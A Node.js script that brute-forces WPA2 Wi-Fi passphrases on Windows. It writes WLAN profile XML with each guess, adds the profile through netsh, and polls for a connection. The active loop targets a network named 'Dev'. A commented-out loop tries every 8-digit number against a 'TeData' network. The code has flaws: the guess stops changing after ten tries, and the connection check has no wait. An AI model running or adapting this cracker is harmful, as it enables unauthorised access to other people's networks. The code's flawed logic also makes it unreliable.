const child_process = require("child_process");
const path = require("path");
const fs = require("fs");
const {isWifiEnabled, isWifiConnected} = require("./state.js");


function createNotExistsFolder() {
  var nameFolder = "1234";
  var pathFolder = path.resolve( __dirname, nameFolder );
  while (fs.existsSync( pathFolder )) {
    nameFolder = Math.floor(Math.random() * 10000);
    pathFolder = path.resolve( __dirname, nameFolder );
  }
  fs.mkdirSync(pathFolder);
  return pathFolder;
}

function connectWifi (ssid, pass) {
  let folderOfFile = createNotExistsFolder();
  let dirConn = path.join(folderOfFile, ssid + ".xml");
  console.log(folderOfFile);
  if (isWifiEnabled()) {
    let dataConn = `
    <?xml version="1.0"?>
    <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
      <name>${ssid}</name>
      <SSIDConfig>
        <SSID>
          <hex>446576</hex>
          <name>${ssid}</name>
        </SSID>
      </SSIDConfig>
      <connectionType>ESS</connectionType>
      <connectionMode>auto</connectionMode>
      <MSM>
        <security>
          <authEncryption>
            <authentication>WPA2PSK</authentication>
            <encryption>AES</encryption>
            <useOneX>false</useOneX>
          </authEncryption>
          <sharedKey>
            <keyType>passPhrase</keyType>
            <protected>false</protected>
            <keyMaterial>${pass}</keyMaterial>
          </sharedKey>
        </security>
      </MSM>
      <MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3">
        <enableRandomization>false</enableRandomization>
        <randomizationSeed>4206287592</randomizationSeed>
      </MacRandomization>
    </WLANProfile>
    `;

    fs.writeFileSync(dirConn, dataConn.trim());
    child_process.spawnSync("netsh", [
      "wlan", "add", "profile", "filename=" + dirConn
    ]);

    fs.unlinkSync(dirConn);
    fs.rmdirSync(path.dirname( dirConn ));
  }
}

mainLoop:
for (var i = 0, pass = ""; i < 99999999; i++) {
  if (i < 10) pass = i;
  connectWifi("Dev", "4373" + pass + "**");
  console.log("===========================> try password: " + pass)
  for (var o = 0; o < 50; o++) {
    if (isWifiConnected()) {
      console.log("DONE...");
      break mainLoop;
    }
  }
}

/*
mainLoop:
for (var i = 0, pass = ""; i < 99999999; i++) {
  if (i < 10) pass = "0000000" + i;
  else if (i < 100) pass = "000000" + i;
  else if (i < 1000) pass = "00000" + i;
  else if (i < 10000) pass = "0000" + i;
  else if (i < 100000) pass = "000" + i;
  else if (i < 1000000) pass = "00" + i;
  else if (i < 10000000) pass = "0" + i;
  else if (i < 100000000) pass = "" + i;

  connectWifi("TeData", pass);
  console.log("===========================> try password: " + pass)
  for (var o = 0; o < 50; o++) {
    if (isWifiConnected()) {
      console.log("DONE...");
      break mainLoop;
    }
  }
}
*/
module.exports.connectWifi = connectWifi;
